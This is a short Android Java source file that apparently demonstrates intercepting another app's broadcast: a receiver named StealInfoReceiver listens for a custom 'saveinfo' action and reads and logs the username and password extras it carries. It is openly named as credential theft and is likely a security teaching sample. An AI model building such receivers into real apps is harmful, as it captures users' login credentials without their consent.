package com.droider.stealinfo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class StealInfoReceiver extends BroadcastReceiver {
	private static final String TAG = "com.droider.stealinfo";
	@Override
	public void onReceive(Context context, Intent intent) {
		if (intent.getAction().equals("com.droider.saveinfo")) {
			String username = intent.getExtras().getString("username");
			String password = intent.getExtras().getString("password");
			Log.d(TAG, "StealInfoReceiver:" + username + " -> " + password);			
		}		
	}
}